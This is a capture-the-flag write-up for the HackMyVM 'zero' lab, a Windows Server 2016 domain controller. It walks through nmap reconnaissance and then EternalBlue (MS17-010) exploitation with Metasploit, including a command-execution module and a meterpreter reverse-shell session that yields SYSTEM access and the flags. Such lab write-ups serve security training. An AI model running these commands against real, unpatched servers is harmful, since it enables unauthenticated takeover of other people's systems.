# zero

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| zero | ruycr4ft | beginner | hackmyvm |

**Summary:** The zero machine presents a Windows Server 2016 Standard Evaluation domain controller named DC01 in the zero.hmv Active Directory forest. Network reconnaissance via netdiscover and nmap identifies a full suite of Active Directory services including DNS on port 53, Kerberos on port 88, LDAP on ports 389 and 3268, SMB on port 445, and WinRM on port 5985. The nmap smb-vuln-ms17-010 script confirms that the target is vulnerable to CVE-2017-0143, the EternalBlue remote code execution vulnerability in Microsoft SMBv1 servers. Using the Metasploit auxiliary/admin/smb/ms17_010_command module, a whoami command is executed remotely and returns nt authority\system, confirming unauthenticated SYSTEM level access. A full reverse shell is then established through the exploit/windows/smb/ms17_010_psexec module with a meterpreter payload, which drops directly into a SYSTEM shell. Both the user flag from the ruycr4ft desktop and the root flag from the Administrator desktop are retrieved from the compromised host.

---

## Reconnaissance

The assessment began with ARP based host discovery followed by comprehensive TCP port scanning and service enumeration against the identified Windows domain controller.

1. Netdiscover was used to identify active hosts on the vboxnet0 interface within the 192.168.56.0/24 subnet:

```zsh
~/projects/labs/hmv                                                                                            43s 20:55:33  
❯ sudo netdiscover -i vboxnet0 -r 192.168.56.0/24
Currently scanning: Finished!   |   Screen View: ARP Reply                                                                                                  
                                                                                                                              
2 Captured ARP Reply packets, from 2 hosts.   Total size: 84                                                                
_____________________________________________________________________________  
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.56.100  08:00:27:8e:28:f8      1      42  PCS Systemtechnik GmbH                                                                                                
192.168.56.151  08:00:27:51:d9:ab      1      42  PCS Systemtechnik GmbH
```

The target was identified at 192.168.56.151.

2. A full TCP port scan was executed against the target to enumerate all listening services:

```zsh
~/projects/labs/hmv                                                                                                  20:58:59  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip                                                                                                  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 20:59 +0700  
Nmap scan report for 192.168.56.151  
Host is up (0.00034s latency).  
Not shown: 65516 filtered tcp ports (no-response)  
PORT      STATE SERVICE  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
9389/tcp  open  adws  
49666/tcp open  unknown  
49667/tcp open  unknown  
49669/tcp open  unknown  
49670/tcp open  unknown  
49684/tcp open  unknown  
49710/tcp open  unknown  
   
Nmap done: 1 IP address (1 host up) scanned in 26.92 seconds
```

The port profile confirmed a Windows Server domain controller with DNS, Kerberos, LDAP, SMB, WinRM, and Active Directory Web Services.

3. Service version detection and script scanning were performed against the key ports:

```zsh
~/projects/labs/hmv                                                                                  27s 20:59:29
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sV -sC $ip -Pn -T4 --min-rate 5000
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 21:02 +0700
Nmap scan report for 192.168.56.151
Host is up (0.0011s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-01 04:02:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZERO)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 16h19m46s, deviation: 4h02m29s, median: 13h59m46s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:51:d9:ab (Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: zero.hmv
|   Forest name: zero.hmv
|   FQDN: DC01.zero.hmv
|_  System time: 2026-08-31T21:02:31-07:00
| smb2-time: 
|   date: 2026-09-01T04:02:31
|_  start_date: 2026-09-01T03:48:51

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.13 seconds

```

The scan confirmed the target is a Windows Server 2016 Standard Evaluation domain controller named DC01 in the zero.hmv domain, with SMB signing required and guest access at the user authentication level.

4. LDAP root DSE enumeration was performed to extract directory service configuration:

```zsh
~/projects/labs/hmv                                                                                                  21:05:11  
❯ nmap -p 88,389 --script krb5-enum-users,ldap-rootdse $ip -Pn  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 21:06 +0700  
Nmap scan report for 192.168.56.151  
Host is up (0.00093s latency).  
   
PORT   STATE SERVICE  
88/tcp  open  kerberos-sec  
389/tcp open  ldap  
| ldap-rootdse:  
| LDAP Results  
|   <ROOT>  
|       currentTime: 20260901040551.0Z  
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=zero,DC=hmv  
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=zero,DC=hmv  
|       namingContexts: DC=zero,DC=hmv  
|       namingContexts: CN=Configuration,DC=zero,DC=hmv  
|       namingContexts: CN=Schema,CN=Configuration,DC=zero,DC=hmv  
|       namingContexts: DC=DomainDnsZones,DC=zero,DC=hmv  
|       namingContexts: DC=ForestDnsZones,DC=zero,DC=hmv  
|       defaultNamingContext: DC=zero,DC=hmv  
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=zero,DC=hmv  
|       configurationNamingContext: CN=Configuration,DC=zero,DC=hmv  
|       rootDomainNamingContext: DC=zero,DC=hmv  
|       supportedControl: 1.2.840.113556.1.4.319  
|       supportedControl: 1.2.840.113556.1.4.801  
|       supportedControl: 1.2.840.113556.1.4.473  
|       supportedControl: 1.2.840.113556.1.4.528  
|       supportedControl: 1.2.840.113556.1.4.417  
|       supportedControl: 1.2.840.113556.1.4.619  
|       supportedControl: 1.2.840.113556.1.4.841  
|       supportedControl: 1.2.840.113556.1.4.529  
|       supportedControl: 1.2.840.113556.1.4.805  
|       supportedControl: 1.2.840.113556.1.4.521  
|       supportedControl: 1.2.840.113556.1.4.970  
|       supportedControl: 1.2.840.113556.1.4.1338  
|       supportedControl: 1.2.840.113556.1.4.474  
|       supportedControl: 1.2.840.113556.1.4.1339  
|       supportedControl: 1.2.840.113556.1.4.1340  
|       supportedControl: 1.2.840.113556.1.4.1413  
|       supportedControl: 2.16.840.1.113730.3.4.9  
|       supportedControl: 2.16.840.1.113730.3.4.10  
|       supportedControl: 1.2.840.113556.1.4.1504  
|       supportedControl: 1.2.840.113556.1.4.1852  
|       supportedControl: 1.2.840.113556.1.4.802  
|       supportedControl: 1.2.840.113556.1.4.1907  
|       supportedControl: 1.2.840.113556.1.4.1948  
|       supportedControl: 1.2.840.113556.1.4.1974  
|       supportedControl: 1.2.840.113556.1.4.1341  
|       supportedControl: 1.2.840.113556.1.4.2026  
|       supportedControl: 1.2.840.113556.1.4.2064  
|       supportedControl: 1.2.840.113556.1.4.2065  
|       supportedControl: 1.2.840.113556.1.4.2066  
|       supportedControl: 1.2.840.113556.1.4.2090  
|       supportedControl: 1.2.840.113556.1.4.2205  
|       supportedControl: 1.2.840.113556.1.4.2204  
|       supportedControl: 1.2.840.113556.1.4.2206  
|       supportedControl: 1.2.840.113556.1.4.2211  
|       supportedControl: 1.2.840.113556.1.4.2239  
|       supportedControl: 1.2.840.113556.1.4.2255  
|       supportedControl: 1.2.840.113556.1.4.2256  
|       supportedControl: 1.2.840.113556.1.4.2309  
|       supportedLDAPVersion: 3  
|       supportedLDAPVersion: 2  
|       supportedLDAPPolicies: MaxPoolThreads  
|       supportedLDAPPolicies: MaxPercentDirSyncRequests  
|       supportedLDAPPolicies: MaxDatagramRecv  
|       supportedLDAPPolicies: MaxReceiveBuffer  
|       supportedLDAPPolicies: InitRecvTimeout  
|       supportedLDAPPolicies: MaxConnections  
|       supportedLDAPPolicies: MaxConnIdleTime  
|       supportedLDAPPolicies: MaxPageSize  
|       supportedLDAPPolicies: MaxBatchReturnMessages  
|       supportedLDAPPolicies: MaxQueryDuration  
|       supportedLDAPPolicies: MaxDirSyncDuration  
|       supportedLDAPPolicies: MaxTempTableSize  
|       supportedLDAPPolicies: MaxResultSetSize  
|       supportedLDAPPolicies: MinResultSets  
|       supportedLDAPPolicies: MaxResultSetsPerConn  
|       supportedLDAPPolicies: MaxNotificationPerConn  
|       supportedLDAPPolicies: MaxValRange  
|       supportedLDAPPolicies: MaxValRangeTransitive  
|       supportedLDAPPolicies: ThreadMemoryLimit  
|       supportedLDAPPolicies: SystemMemoryLimitPercent  
|       highestCommittedUSN: 32806  
|       supportedSASLMechanisms: GSSAPI  
|       supportedSASLMechanisms: GSS-SPNEGO  
|       supportedSASLMechanisms: EXTERNAL  
|       supportedSASLMechanisms: DIGEST-MD5  
|       dnsHostName: DC01.zero.hmv  
|       ldapServiceName: zero.hmv:dc01$@ZERO.HMV  
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=zero,DC=hmv  
|       supportedCapabilities: 1.2.840.113556.1.4.800  
|       supportedCapabilities: 1.2.840.113556.1.4.1670  
|       supportedCapabilities: 1.2.840.113556.1.4.1791  
|       supportedCapabilities: 1.2.840.113556.1.4.1935  
|       supportedCapabilities: 1.2.840.113556.1.4.2080  
|       supportedCapabilities: 1.2.840.113556.1.4.2237  
|       isSynchronized: TRUE  
|       isGlobalCatalogReady: TRUE  
|       domainFunctionality: 7  
|       forestFunctionality: 7  
|_      domainControllerFunctionality: 7  
Service Info: Host: DC01; OS: Windows  
   
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

The LDAP root DSE revealed the full directory structure of the zero.hmv domain, with the domain controller named DC01 operating at domain, forest, and controller functionality level 7 (Windows Server 2016).

5. The SMB service was checked for the EternalBlue vulnerability using the nmap ms17-010 script:

```zsh
~/projects/labs/hmv                                                                                      21:09:01
❯ nmap -p445 --script smb-vuln-ms17-010 $ip -Pn
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 21:16 +0700
Nmap scan report for 192.168.56.151
Host is up (0.0011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds

```

The target was confirmed vulnerable to CVE-2017-0143 (EternalBlue), a critical remote code execution vulnerability in Microsoft SMBv1 servers. This vulnerability allows unauthenticated attackers to execute arbitrary code with SYSTEM privileges by sending crafted SMBv1 packets to the Server service.

---

## Initial Access

### MS17-010 EternalBlue Exploitation via Metasploit

6. Metasploit Framework was launched and the auxiliary command execution module for MS17-010 was selected to verify remote code execution:

```zsh
~/projects/labs/hmv                                                                              11m 51s 21:52:29
❯ msfconsole -q
msf > search ms17_010

Matching Modules
================

   #   Full Name                                      Disclosure Date  Rank     Check  Name
   -   ---------                                      ---------------  ----     -----  ----
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             2017-03-14       normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .


Interact with a module by name or index. For example info 26, use 26 or use auxiliary/scanner/smb/smb_ms17_010

msf > use auxiliary/admin/smb/ms17_010_command
msf auxiliary(admin/smb/ms17_010_command) > set RHOSTS 192.168.56.151
RHOSTS => 192.168.56.151
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND whoami
COMMAND => whoami
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.56.151:445    - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 192.168.56.151:445    - Built a write-what-where primitive...
[+] 192.168.56.151:445    - Overwrite complete... SYSTEM session obtained!
[+] 192.168.56.151:445    - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.56.151:445    - Getting the command output...
[*] 192.168.56.151:445    - Executing cleanup...
[+] 192.168.56.151:445    - Cleanup was successful
[+] 192.168.56.151:445    - Command completed successfully!
[*] 192.168.56.151:445    - Output for "whoami":

nt authority\system


[*] 192.168.56.151:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The auxiliary command module confirmed that the target executes commands as `nt authority\system`, proving that the EternalBlue vulnerability provides unauthenticated SYSTEM level access without requiring any credentials.

7. A full reverse shell payload was deployed using the ms17_010_psexec exploit module to obtain an interactive meterpreter session:

```zsh
msf auxiliary(admin/smb/ms17_010_command) > use exploit/windows/smb/ms17_010_psexec  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.56.151  
RHOSTS => 192.168.56.151  
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.56.1  
LHOST => 192.168.56.1  
msf exploit(windows/smb/ms17_010_psexec) > run  
[*] Started reverse TCP handler on 192.168.56.1:4444  
[*] 192.168.56.151:445 - Target OS: Windows Server 2016 Standard Evaluation 14393  
[*] 192.168.56.151:445 - Built a write-what-where primitive...  
[+] 192.168.56.151:445 - Overwrite complete... SYSTEM session obtained!  
[*] 192.168.56.151:445 - Selecting PowerShell target  
[*] 192.168.56.151:445 - Executing the payload...  
[+] 192.168.56.151:445 - Service start timed out, OK if running a command or non-service executable...  
[*] Sending stage (203452 bytes) to 192.168.56.151  
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.151:49751) at 2026-08-31 21:58:53 +0700  
   
meterpreter > shell  
Process 452 created.  
Channel 1 created.  
Microsoft Windows [Version 10.0.14393]  
(c) 2016 Microsoft Corporation. All rights reserved.  
   
C:\Windows\system32>whoami  
whoami  
nt authority\system
```

The psexec exploit module established a meterpreter session, and a Windows command shell was spawned via the `shell` command. The shell confirmed execution as `nt authority\system` on the domain controller DC01 running Windows Server 2016 Standard Evaluation build 14393.

---

## Privilege Escalation

### Flag Retrieval as SYSTEM

8. With SYSTEM level access already achieved through the EternalBlue exploit, both flags were retrieved directly from the filesystem:

```zsh
C:\>type Users\Administrator\Desktop\root.txt  
type Users\Administrator\Desktop\root.txt  
HMV{Z3r...}  
   
C:\>type Users\ruycr4ft\Desktop\user.txt  
type Users\ruycr4ft\Desktop\user.txt  
HMV{D0n...}
```

The root flag was retrieved from `C:\Users\Administrator\Desktop\root.txt` and the user flag was retrieved from `C:\Users\ruycr4ft\Desktop\user.txt`. No further privilege escalation was required as the EternalBlue exploit provided SYSTEM level access directly.

---

## Attack Chain Summary

1. **Reconnaissance**: Netdiscover and nmap scanning identified a Windows Server 2016 domain controller at 192.168.56.151 with a full Active Directory service stack including DNS, Kerberos, LDAP, SMB, and WinRM.
2. **Vulnerability Discovery**: The nmap smb-vuln-ms17-010 script confirmed the target is vulnerable to CVE-2017-0143, the EternalBlue remote code execution vulnerability in Microsoft SMBv1 servers, rated as HIGH risk.
3. **Exploitation**: The Metasploit auxiliary/admin/smb/ms17_010_command module was used to verify remote command execution, returning `nt authority\system` for a `whoami` command, confirming unauthenticated SYSTEM level access.
4. **Internal Enumeration**: The domain controller DC01 in the zero.hmv forest was confirmed to host user accounts including ruycr4ft and Administrator, with flag files on their respective desktops.
5. **Privilege Escalation**: A full meterpreter reverse shell was established via the exploit/windows/smb/ms17_010_psexec module, dropping directly into a SYSTEM shell, and both the user and root flags were retrieved from the filesystem without requiring any additional escalation.
